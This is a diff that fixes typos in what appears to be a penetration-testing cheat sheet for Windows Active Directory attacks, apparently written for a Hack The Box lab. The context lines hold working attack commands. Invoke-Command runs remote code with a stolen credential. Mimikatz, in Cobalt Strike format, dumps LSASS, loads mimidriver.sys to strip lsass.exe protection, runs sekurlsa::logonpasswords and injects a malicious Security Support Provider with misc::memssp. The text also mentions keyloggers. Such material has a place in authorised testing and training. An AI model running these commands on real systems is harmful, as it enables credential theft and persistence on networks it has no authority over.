@@ -25,7 +25,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUs
 Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
 ```
 
-#### Import a powershell module and execute its functions remotely
+#### Import a PowerShell module and execute its functions remotely
 
 Execute the command and start a session
 
@@ -61,7 +61,7 @@ Invoke-Command -Session $sess -ScriptBlock {$ps}
 
 ### Mimikatz
 
-This commands are in cobalt strike format!
+These commands are in cobalt strike format!
 
 Dump LSASS:
 
@@ -168,19 +168,19 @@ Check if LSA runs as a protected process by looking if the variable "RunAsPPL" i
 reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 ```
 
-Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe Now lets import the mimidriver.sys to the system
+Next upload the mimidriver.sys from the official mimikatz repo to the same folder of your mimikatz.exe Now let's import the mimidriver.sys to the system
 
 ```text
 mimikatz # !+
 ```
 
-Now lets remove the protection flags from lsass.exe process
+Now let's remove the protection flags from lsass.exe process
 
 ```text
 mimikatz # !processprotect /process:lsass.exe /remove
 ```
 
-Finally run the logonpasswords function to dump lsass
+Finally, run the logon passwords function to dump lsass
 
 ```text
 mimikatz # sekurlsa::logonpasswords
@@ -197,7 +197,7 @@ Check if a process called lsaiso.exe exists on the running processes
 tasklist |findstr lsaiso
 ```
 
-If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data. Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+If it does there isn't a way to dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data. Let's inject our own malicious Security Support Provider into memory, for this example, I'll use the one Mimikatz provides
 
 ```text
 mimikatz # misc::memssp
